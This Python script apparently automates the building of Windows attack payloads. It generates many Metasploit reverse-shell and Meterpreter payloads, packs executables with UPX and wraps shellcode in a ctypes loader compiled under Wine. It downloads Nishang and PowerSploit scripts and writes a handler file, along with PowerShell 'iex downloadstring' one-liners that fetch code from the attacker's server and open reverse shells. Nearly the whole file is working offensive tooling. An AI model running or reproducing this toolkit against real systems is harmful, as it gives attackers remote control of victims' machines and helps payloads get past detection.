#!/usr/bin/env python3

# To install on 64bit Ubuntu/Debian/Kali:
#   dpkg --add-architecture i386
#   apt-get update
#   apt-get install wine32
#   apt-get install winbind

# On Kali:
#   apt-get install python3-netifaces python3-requests
# Or:
#   pip install netifaces requests

import subprocess
import os
import shutil
import stat
import requests
from urllib.parse import urlparse
from netifaces import AF_INET, ifaddresses

SERVER = ifaddresses('eth0')[AF_INET][0]['addr']
WEBSERVER_PORT = 8000

PS_REV_TCP_URL = "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
PS_INV_SC_URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1"

PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/2.7.12/python-2.7.12.msi"
PYTHON_MSI = os.path.basename(urlparse(PYTHON_DOWNLOAD_URL).path)

PY_TEMPLATE = """#!/usr/bin/env python
import ctypes

# Shellcode:
{}
shellcode = bytearray(buf)
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
"""


WEBSERVER = """#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer

PORT = {}
IP = '{}'

server_address = (IP, PORT)
httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
httpd.serve_forever()
""".format(WEBSERVER_PORT, SERVER)


SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))


WINE_DIR = '{}/wine'.format(SCRIPT_DIR)


def make_executable(f):
    fname = '{}/{}'.format(SCRIPT_DIR, f)
    st = os.stat(fname)
    os.chmod(fname, st.st_mode | stat.S_IEXEC)


def add_handler(payload, server, port):
    s = "use exploit/multi/handler\n"
    s += "set payload {}\n".format(payload)
    s += "set lhost {}\n".format(server)
    s += "set lport {}\n".format(port)
    s += "set ExitOnSession false\n"
    s += "exploit -j\n\n"
    return s


def write_text_file(filename, content):
    print("Writing {} ...".format(filename))
    with open('{}/{}'.format(SCRIPT_DIR, filename), 'wt') as f:
        f.write(content)
    print("Done")
    print()


def download_file(url, local):
    r = requests.get(url)
    write_text_file(local, r.text)


def execute_command(c, env=None):
    size = shutil.get_terminal_size()
    print('#' * size.columns)
    print()
    print("Executing {}".format(c))
    # Needed when shell = False
    if type(c) is str:
        c = c.split()
    if env:
        print("Environment: {}".format(env))
        print()
        subprocess.run(c, stderr=subprocess.STDOUT, env=env)
    else:
        subprocess.run(c, stderr=subprocess.STDOUT)
    print()
    print('#' * size.columns)
    print()


def get_wine_env():
    return dict(os.environ, WINEARCH='win32', WINEPREFIX=WINE_DIR)


def setup_wine():
    print("Setting up wine environment")
    if os.path.exists(WINE_DIR):
        print("Removing old wine dir {}".format(WINE_DIR))
        shutil.rmtree(WINE_DIR)
    if not os.path.exists('{}/{}'.format(SCRIPT_DIR, PYTHON_MSI)):
        print("Downloading python MSI")
        execute_command('wget -O {}/{} {}'.format(SCRIPT_DIR, PYTHON_MSI, PYTHON_DOWNLOAD_URL))
    print("Installing python")
    # add wine env vars
    environment = get_wine_env()
    # print current env
    execute_command('env', environment)
    # setup wine dir
    execute_command('wineboot -u', environment)
    # install python
    execute_command('wine msiexec /i {}/{} TARGETDIR=C:\Python27 ALLUSERS=1 PrependPath=1 /q'.format(SCRIPT_DIR, PYTHON_MSI), environment)
    # upgrade pip
    execute_command('wine python.exe -m pip install --upgrade pip', environment)
    # install pyinstaller
    execute_command('wine pip install pyinstaller', environment)


PAYLOADS = [
    # exes
    {'filename': 'reverse_http', 'payload': 'windows/meterpreter/reverse_http', 'port': 8001, 'format': 'exe'},
    {'filename': 'reverse_https', 'payload': 'windows/meterpreter/reverse_https', 'port': 8002, 'format': 'exe'},
    {'filename': 'reverse_tcp', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8003, 'format': 'exe'},
    {'filename': 'meterpreter_reverse_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8004, 'format': 'exe'},
    {'filename': 'meterpreter_reverse_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8005, 'format': 'exe'},
    {'filename': 'meterpreter_reverse_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8006, 'format': 'exe'},
    {'filename': 'reverse_tcp', 'payload': 'windows/shell/reverse_tcp', 'port': 8007, 'format': 'exe'},
    {'filename': 'shell_reverse_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8008, 'format': 'exe'},
    # python stuff
    {'filename': 'reverse_http_py', 'payload': 'windows/meterpreter/reverse_http', 'port': 8101, 'format': 'py'},
    {'filename': 'reverse_https_py', 'payload': 'windows/meterpreter/reverse_https', 'port': 8102, 'format': 'py'},
    {'filename': 'reverse_tcp_py', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8103, 'format': 'py'},
    {'filename': 'meterpreter_reverse_http_py', 'payload': 'windows/meterpreter_reverse_http', 'port': 8104, 'format': 'py'},
    {'filename': 'meterpreter_reverse_https_py', 'payload': 'windows/meterpreter_reverse_https', 'port': 8105, 'format': 'py'},
    {'filename': 'meterpreter_reverse_tcp_py', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8106, 'format': 'py'},
    {'filename': 'reverse_tcp_py', 'payload': 'windows/shell/reverse_tcp', 'port': 8107, 'format': 'py'},
    {'filename': 'shell_reverse_tcp_py', 'payload': 'windows/shell_reverse_tcp', 'port': 8108, 'format': 'py'},
    # invoke shellcode stuff
    {'filename': 'reverse_http_ps', 'payload': 'windows/meterpreter/reverse_http', 'port': 8201, 'format': 'ps1'},
    {'filename': 'reverse_https_ps', 'payload': 'windows/meterpreter/reverse_https', 'port': 8202, 'format': 'ps1'},
    {'filename': 'reverse_tcp_ps', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8203, 'format': 'ps1'},
    {'filename': 'meterpreter_reverse_http_ps', 'payload': 'windows/meterpreter_reverse_http', 'port': 8204, 'format': 'ps1'},
    {'filename': 'meterpreter_reverse_https_ps', 'payload': 'windows/meterpreter_reverse_https', 'port': 8205, 'format': 'ps1'},
    {'filename': 'meterpreter_reverse_tcp_ps', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8206, 'format': 'ps1'},
    {'filename': 'reverse_tcp_ps', 'payload': 'windows/shell/reverse_tcp', 'port': 8207, 'format': 'ps1'},
    {'filename': 'shell_reverse_tcp_ps', 'payload': 'windows/shell_reverse_tcp', 'port': 8208, 'format': 'ps1'}
]

ADDITIONAL_HANDLERS = [
    {'payload': 'generic/shell_reverse_tcp', 'port': '8901'}
]

handler = ""
commands = ""

print("Detected IP {}".format(SERVER))

execute_command('env')

setup_wine()

for p in PAYLOADS:
    command = 'msfvenom --platform windows -p {} -f {} -e generic/none -o {}/{}.{} LHOST={} LPORT={}'.format(p['payload'], p['format'], SCRIPT_DIR, p['filename'], p['format'], SERVER, p['port'])
    execute_command(command)
    handler += add_handler(p['payload'], SERVER, p['port'])
    print()
    if p['format'] == 'exe':
        print("Generating packed payload...")
        command = 'upx -9 -f -o {}/upx_{}.exe {}/{}.{}'.format(SCRIPT_DIR, p['filename'], SCRIPT_DIR, p['filename'], p['format'])
        execute_command(command)
        print()
    elif p['format'] == 'py':
        # add shellcode handler stuff
        print("Adding python stub")
        tmp_file = '{}/{}.{}'.format(SCRIPT_DIR, p['filename'], p['format'])
        buf = open(tmp_file).read()
        with open(tmp_file, 'wt') as tf:
            tf.write(PY_TEMPLATE.format(buf))
        print("Generating Python executable")
        execute_command('wine pyinstaller --onefile --distpath=. {}'.format(tmp_file), get_wine_env())
        os.remove('{}/{}.spec'.format(SCRIPT_DIR, p['filename']))
        os.remove(tmp_file)
        print("Done")
        print()
    elif p['format'] == 'ps1':
        tmp_file = '{}/{}.{}'.format(SCRIPT_DIR, p['filename'], p['format'])
        buf = open(tmp_file).read()
        os.remove(tmp_file)

        buf = buf.replace("\n", ",")
        buf = buf.replace("$buf += ", "")
        buf = buf.replace("[Byte[]] $buf = ", "")
        buf = buf.rstrip(',')
        txt = "# {}\n".format(p['payload'])
        txt += "%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File {}.ps1\n".format(p['filename'])

        ps1 = "iex(new-object net.webclient).downloadstring('http://{}:{}/invsc.ps1')\n".format(SERVER, WEBSERVER_PORT)
        ps1 += "Invoke-Shellcode -Shellcode @({})\n".format(buf)

        write_text_file('{}.txt'.format(p['filename']), txt)
        write_text_file('{}.ps1'.format(p['filename']), ps1)

print("Adding additional handlers ...")
for h in ADDITIONAL_HANDLERS:
    handler += add_handler(h['payload'], SERVER, h['port'])
    commands += "iex(new-object net.webclient).downloadstring('http://{}:{}/reverse.ps1')\n".format(SERVER, WEBSERVER_PORT)
    commands += "Invoke-PowerShellTcp -Reverse -IPAddress {} -Port {}\n".format(SERVER, h['port'])
    commands += "\n\n"
print("Done")
print()

print("Downloading reverse TCP")
download_file(PS_REV_TCP_URL, 'reverse.ps1')
print("Done")
print()

print("Downloading Invoke-Shellcode")
download_file(PS_INV_SC_URL, 'invsc.ps1')
print("Done")
print()


write_text_file('handler.rc', handler)
write_text_file('webserver.py', WEBSERVER)
make_executable('webserver.py')
write_text_file('commands.txt', commands)

print("Cleanup")
for x in ('build', 'wine'):
    if os.path.exists(x):
        print("Removing dir {}".format(x))
        shutil.rmtree(x)
print("Done")
